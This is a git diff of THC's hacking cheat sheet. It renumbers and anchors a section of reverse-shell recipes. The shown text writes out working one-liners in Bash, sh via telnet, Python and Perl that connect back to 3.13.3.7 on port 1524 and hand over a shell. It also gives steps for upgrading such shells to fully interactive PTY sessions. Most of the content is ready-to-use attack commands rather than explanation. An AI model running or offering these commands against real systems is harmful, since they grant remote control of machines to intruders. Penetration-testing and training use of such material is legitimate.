@@ -1,4 +1,4 @@
-# THC's Tips & Tricks (Cheat Sheet)
+# THC's favourite Tips & Tricks & Hacks (Cheat Sheet)
 
 A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.
 
@@ -24,6 +24,16 @@ Got tricks? Send them to root@thc.org or submit a pull request.
    1. [xxd](#fex-anchor)
    1. [File transfer using screen from REMOTE to LOCAL](#ftsrl-anchor)
    1. [File transfer using screen from LOCAL to REMOTE](#ftslr-anchor)
+5. [Reverse Shell / Dumb Shell](#rs-anchor)
+   1. [Reverse Shells](#rs-anchor)
+      1. [with Bash](#rswb-anchor)
+      1. [without Bash](#rswob-anchor)
+      1. [with Python](#rswpy-anchor)
+      1. [with Perl](#rswpl-anchor)
+   1. [Upgrading to PTY](#rsu-anchor)
+      1. [Upgrade a reverse shell to a pty shell](#rsup-anchor)
+      1. [Upgrade a reverse shell to a fully interactive shell](#rsup2-anchor)
+      1. [Reverse shell with socat (fully interactive)](#rssc-anchor)
    
 
 ---
@@ -345,7 +355,10 @@ Store data in `/mnt/crypted`, then unmount:
 # losetup -d /dev/loop0
 ```
 
-**23. Reverse shell with Bash**
+---
+<a id="rs-anchor"></a>
+<a id="rswb-anchor"></a>
+**5.i.a. Reverse shell with Bash**
 
 Start netcat to listen on port 1524 on your system:
 ```
@@ -354,10 +367,11 @@ $ nc -nvlp 1524
 
 On the remote system. This Bash will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
 ```
-$ bash -i 2>&1 >& /dev/tcp/3.13.3.7/1524 0>&1
+$ bash -i 2>&1 >&/dev/tcp/3.13.3.7/1524 0>&1
 ```
 
-**24. Reverse shell without Bash**
+<a id="rswob-anchor"></a>
+**5.i.b. Reverse shell without Bash**
 
 Especially embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
 
@@ -373,12 +387,14 @@ $ mkfifo /tmp/.io
 $ sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
 ```
 
-**24. Reverse shell with Python**
+<a id="rswpy-anchor"></a>
+**5.i.c. Reverse shell with Python**
 ```
 $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-**25. Reverse shell with Perl**
+<a id="rswpl-anchor"></a>
+**5.i.d. Reverse shell with Perl**
 
 ```
 # method 1
@@ -387,7 +403,9 @@ $ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprot
 $ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
 
-**26. Upgrade a reverse shell to a pty shell**
+<a id="rsu-anchor"></a>
+<a id="rsup-anchor"></a>
+**5.ii.a. Upgrade a reverse shell to a PTY shell**
 
 Any of the above reverse shells are limited. For example *sudo bash* or *top* will not work. To make these work we have to upgrate the shell to a real PTY shell:
 
@@ -402,7 +420,8 @@ perl -e 'exec "/bin/bash";'
 awk 'BEGIN {system("/bin/bash")}'
 ```
 
-**27. Upgrade a reverse shell to a fully interactive shell**
+<a id="rsup2-anchor"></a>
+**5.ii.b. Upgrade a reverse shell to a fully interactive shell**
 
 ...and if we also like to use Ctrl-C we have to go all the way and upgrade the reverse shell to a real fully colorfull interactive shell:
 
@@ -424,7 +443,8 @@ $ export TERM=xterm-256color
 $ stty rows 24 columns 80
 ```
 
-**28. Reverse shell with socat (fully interactive)**
+<a id="rssc-anchor"></a>
+**5.ii.c. Reverse shell with socat (fully interactive)**
 
 ...or install socat and get it done without much fiddling about:
 
